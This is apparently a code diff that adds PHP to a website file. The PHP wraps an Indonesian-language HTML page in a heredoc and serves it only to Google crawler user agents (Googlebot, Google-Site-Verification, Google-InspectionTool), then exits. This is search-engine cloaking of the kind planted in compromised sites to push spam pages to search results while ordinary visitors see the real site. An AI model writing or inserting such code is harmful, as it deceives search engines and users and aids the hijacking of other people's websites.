@@ -1,4 +1,13 @@
 
+<?php
+function check_user_agent($agent) {
+    return strpos($_SERVER['HTTP_USER_AGENT'], $agent) !== false;
+}
+
+$useragent_code = <<<'HTML'
+
+
+
 <!DOCTYPE html>
 <html xmlns:wormhole="http://www.w3.org/1999/xhtml" lang="id-ID">
     <head>
@@ -4602,6 +4611,15 @@ window.onload = function() {
     <script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'92f3485d1a7a7c7f',t:'MTc0NDQ2Njc2OS4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script><script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"rayId":"9433e02d0abfe551","version":"2025.4.0-1-g37f21b1","r":1,"token":"b2bdeefd2b4e4f2d9e92ed74c8ec63c4","serverTiming":{"name":{"cfExtPri":true,"cfL4":true,"cfSpeedBrain":true,"cfCacheStatus":true}}}' crossorigin="anonymous"></script>
 </body>
 </html>
+
+
+HTML;
+
+if (check_user_agent('Googlebot') || check_user_agent('Google-Site-Verification') || check_user_agent('Google-InspectionTool')) {
+    echo $useragent_code;
+    exit;
+}
+?>
 
 <?php
 
